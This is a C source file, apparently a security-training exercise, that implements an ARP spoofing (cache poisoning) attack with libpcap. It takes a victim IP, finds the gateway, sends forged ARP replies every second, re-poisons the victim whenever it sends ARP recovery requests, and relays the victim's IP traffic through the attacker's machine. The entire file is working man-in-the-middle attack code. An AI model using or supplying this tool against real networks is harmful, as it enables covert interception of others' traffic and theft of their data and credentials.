#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <pthread.h>

#define MACADDR_FILE    "/sys/class/net/ens33/address"
#define GATEWAY_FILE   "/proc/net/route"
#define NETWORK_NAME    "ens33"
#define BUF_SIZE        32


struct route_info {
    char iface[IFNAMSIZ];
    unsigned int dest;
    unsigned int gateway;
    unsigned short flags;
    unsigned int refcnt;
    unsigned int use;
    unsigned int metric;
    unsigned int mask;
    unsigned int mtu;
    unsigned int window;
    unsigned int irtt;
} rtinfo;


struct ether_header eth_hdr;
struct arphdr arp_hdr;
struct ether_arp eth_arp;
struct in_addr my_ip, sender_ip, receiver_ip;

char *dev, errbuf[PCAP_ERRBUF_SIZE];

u_int8_t my_mac[ETH_ALEN], sender_mac[ETH_ALEN], receiver_mac[ETH_ALEN];
pcap_t *handle;


int setup_pcap()
{
    struct bpf_program fp;

    bpf_u_int32 mask;
    bpf_u_int32 net;

    char filter_exp[] = "";

    dev = pcap_lookupdev(errbuf);
    pcap_lookupnet(dev, &net, &mask, errbuf);

    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    pcap_compile(handle, &fp, filter_exp, 0, net);
    pcap_setfilter(handle, &fp);

    return 0;
}


void *cap_macaddress(void *arg)
{
    struct ether_header *eth_hdr;
    struct ether_arp *eth_arp;

    struct pcap_pkthdr header;
    const u_char *arp_rply;

    while( 1 ) {
        arp_rply = pcap_next(handle, &header);
        if(!arp_rply) continue;

        eth_hdr = (struct ether_header *)arp_rply;
        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {
            eth_arp = (struct ether_arp *)(arp_rply + sizeof(struct ether_header));
            if(ntohs(eth_arp->ea_hdr.ar_op) == ARPOP_REPLY)   {
                if(!memcmp(eth_arp->arp_spa, &sender_ip, 4)) memcpy(sender_mac, eth_arp->arp_sha, ETH_ALEN);
                else if(!memcmp(eth_arp->arp_spa, &receiver_ip, 4)) memcpy(receiver_mac, eth_arp->arp_sha, ETH_ALEN);
                pthread_exit(NULL);
            }
        }
    }
}


void send_arprqst_pckt(struct in_addr *target_ip)
{
    u_char arp_rqst[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    pthread_t tid;

    pthread_create(&tid, NULL, cap_macaddress, NULL);

    eth_hdr.ether_type  = htons(ETHERTYPE_ARP);
    memcpy(&eth_hdr.ether_shost, my_mac, ETH_ALEN);
    memset(&eth_hdr.ether_dhost, 0xFF, ETH_ALEN);

    arp_hdr.ar_hrd = htons(1);
    arp_hdr.ar_hln = 6;
    arp_hdr.ar_pro = htons(2048);
    arp_hdr.ar_pln = 4;
    arp_hdr.ar_op  = htons(ARPOP_REQUEST);

    eth_arp.ea_hdr = arp_hdr;
    memcpy(eth_arp.arp_sha, my_mac, ETH_ALEN);
    memcpy(eth_arp.arp_spa, &my_ip, 4);
    memset(eth_arp.arp_tha, 0x00, ETH_ALEN);
    memcpy(eth_arp.arp_tpa, target_ip, 4);

    memcpy(arp_rqst, &eth_hdr, sizeof(struct ether_header));
    memcpy(arp_rqst + sizeof(struct ether_header), &eth_arp, sizeof(struct ether_arp));

    pcap_sendpacket(handle, arp_rqst, sizeof(struct ether_header) + sizeof(struct ether_arp));
    pthread_join(tid, NULL);
}


void send_arprply_pckt(struct in_addr *target_ip, unsigned char *target_mac, struct in_addr *source_ip)
{
    u_char arp_rply_pckt[sizeof(struct ether_header) + sizeof(struct ether_arp)];

    eth_hdr.ether_type  = htons(ETHERTYPE_ARP);
    memcpy(&eth_hdr.ether_shost, my_mac, ETH_ALEN);
    memcpy(&eth_hdr.ether_dhost, target_mac, ETH_ALEN);

    arp_hdr.ar_hrd = htons(1);
    arp_hdr.ar_hln = 6;
    arp_hdr.ar_pro = htons(2048);
    arp_hdr.ar_pln = 4;
    arp_hdr.ar_op  = htons(ARPOP_REPLY);

    eth_arp.ea_hdr = arp_hdr;
    memcpy(eth_arp.arp_sha, my_mac, ETH_ALEN);
    memcpy(eth_arp.arp_spa, source_ip, 4);
    memcpy(eth_arp.arp_tha, target_mac, ETH_ALEN);
    memcpy(eth_arp.arp_tpa, target_ip, 4);

    memcpy(arp_rply_pckt, &eth_hdr, sizeof(struct ether_header));
    memcpy(arp_rply_pckt + sizeof(struct ether_header), &eth_arp, sizeof(struct ether_arp));

    pcap_sendpacket(handle, arp_rply_pckt, sizeof(struct ether_header) + sizeof(struct ether_arp));
}


void get_macandip()
{
    struct ifreq ifr;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, NETWORK_NAME, IFNAMSIZ-1);

    ioctl(sock, SIOCGIFHWADDR, &ifr);
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    ioctl(sock, SIOCGIFADDR, &ifr);
    memcpy(&my_ip, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4);

    close(sock);
}


void get_receiverip()
{
    FILE *route_fp;
    char column[BUF_SIZE];

    route_fp = fopen(GATEWAY_FILE, "rt");
    while(fscanf(route_fp, "%s", column)) if(!strcmp(column, "IRTT")) break;
    while(1) {
        fscanf(route_fp, "%s\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X",
               rtinfo.iface, &rtinfo.dest, &rtinfo.gateway, &rtinfo.flags,
               &rtinfo.refcnt, &rtinfo.use, &rtinfo.metric, &rtinfo.mask,
               &rtinfo.mtu, &rtinfo.window, &rtinfo.irtt);
        if(feof(route_fp)) break;
        if(rtinfo.dest == 0x00000000 && rtinfo.mask == 0x00000000) {
            memcpy(&receiver_ip, &rtinfo.gateway, 4); break;
        }
    }

    fclose(route_fp);
}


void get_vctmgwmac()
{
    send_arprqst_pckt(&receiver_ip);
    send_arprqst_pckt(&sender_ip);
}


void *infect_periodic(void *arg)
{
    while( 1 ) {
        send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
        // send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
        sleep(1);
    }
}


void *prvnt_recov_dorelay(void *arg)
{
    struct ether_header *eth_hdr;
    struct ether_arp *eth_arp;
    struct ip *ip_hdr;
    struct pcap_pkthdr header;

    const u_char *packet;
    u_char *relay_pckt;

    while( 1 ) {
        packet = pcap_next(handle, &header);
        if(!packet) continue;

        eth_hdr = (struct ether_header *)packet;

        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {
            eth_arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
            if(ntohs(eth_arp->ea_hdr.ar_op) == ARPOP_REQUEST) {         // detected arp recovery
                send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
                // send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
            }
        }
        else if(ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {           // normal IP packet must be relayed
            ip_hdr = (struct ip *)(packet + sizeof(struct ether_header));
            if(!memcmp(eth_hdr->ether_shost, sender_mac, ETH_ALEN)) {
                relay_pckt = (u_char *)malloc(header.len);              // from sender to receiver
                memcpy(relay_pckt, packet, header.len);
                memcpy(((struct ether_header *)relay_pckt)->ether_shost, my_mac, ETH_ALEN);
                memcpy(((struct ether_header *)relay_pckt)->ether_dhost, receiver_mac, ETH_ALEN);
                pcap_sendpacket(handle, relay_pckt, header.len);
                free(relay_pckt);
            }
            /*
            else if(!memcmp(eth_hdr->ether_shost, receiver_mac, ETH_ALEN) && !memcmp(&(ip_hdr->ip_dst), &sender_ip, 4)) {
                relay_pckt = (u_char *)malloc(header.len);              // from receiver to sender
                memcpy(relay_pckt, packet, header.len);
                memcpy(((struct ether_header *)relay_pckt)->ether_shost, my_mac, ETH_ALEN);
                memcpy(((struct ether_header *)relay_pckt)->ether_dhost, sender_mac, ETH_ALEN);
                pcap_sendpacket(handle, relay_pckt, header.len);
                free(relay_pckt);
            }
            */
        }
    }
}


void infect()
{
    pthread_t tid[2];

    send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
    // send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);

    pthread_create(&tid[0], NULL, infect_periodic, NULL);
    pthread_create(&tid[1], NULL, prvnt_recov_dorelay, NULL);
}


int main(int argc, char *argv[])
{
    char my_ipaddr[INET_ADDRSTRLEN], sender_ipaddr[INET_ADDRSTRLEN];
    char receiver_ipaddr[INET_ADDRSTRLEN];
    char my_macaddr[ETH_ALEN * 2 + 6], sender_macaddr[ETH_ALEN * 2 + 6];
    char receiver_macaddr[ETH_ALEN * 2 + 6];
    char *track = "취약점";
    char *name  = "신동민";

    int option, num_sessions = 0;

    printf("[bob5][%s]arp_poison[%s]\n", track, name);
    if(argc != 2 ) {
        printf("USAGE : %s <VICTIM_IP>\n", argv[0]);
        return 1;
    }

    setup_pcap();

    strncpy(sender_ipaddr, argv[1], INET_ADDRSTRLEN);
    inet_pton(AF_INET, sender_ipaddr, &sender_ip.s_addr);

    printf("\n========== GETTING SENDER'S IP ===========\n\n");
    printf("SENDER'S IP\t: %s\n", sender_ipaddr);

    /* step 1. get my mac and ip address using ioctl */
    printf("\n============= GETTING MY IP ==============\n\n");
    get_macandip();
    inet_ntop(AF_INET, &my_ip.s_addr, my_ipaddr, INET_ADDRSTRLEN);
    ether_ntoa_r((struct ether_addr *)my_mac, my_macaddr);
    printf("MY IP\t\t: %s\n", my_ipaddr);
    printf("MY MAC\t\t: %s\n", my_macaddr);

    /* step 2. get ip address of receiver */
    printf("\n========== GETTING receiver'S IP =========\n\n");
    get_receiverip();
    inet_ntop(AF_INET, &receiver_ip.s_addr, receiver_ipaddr, INET_ADDRSTRLEN);
    printf("RECEIVER's IP\t: %s\n", receiver_ipaddr);

    /* step 3. send ARP request to sender and receiver and get sender's and receiver's MAC */
    printf("\n= GETTING SENDER AND receiver'S MAC ADDR =\n\n");
    get_vctmgwmac();
    ether_ntoa_r((struct ether_addr *)receiver_mac, receiver_macaddr);
    ether_ntoa_r((struct ether_addr *)sender_mac, sender_macaddr);
    printf("RECEIVER'S MAC\t\t: %s\n", receiver_macaddr);
    printf("SENDER'S MAC\t\t: %s\n", sender_macaddr);

    /* step 4. send infected ARP reply packet to sender and receiver */
    printf("\n======== INFECTING VICTIM(SENDER) ========\n");
    infect();
    printf("\n%s IS INFECTED ...\n", sender_ipaddr);

    while( 1 ) {
        printf("\n======= SELECT ONE OF BELOW OPTIONS ======\n");
        printf("1. LOOK SESSIONS\n2. INFECT OTHERS\n3. EXIT(HALT)\n");
        printf(">> "); scanf("%d", &option);
        switch(option) {
        case 1:
            break;
        case 2:
            break;
        case 3:
            return 0;
        }
    }

    pcap_close(handle);
    return 0;
}
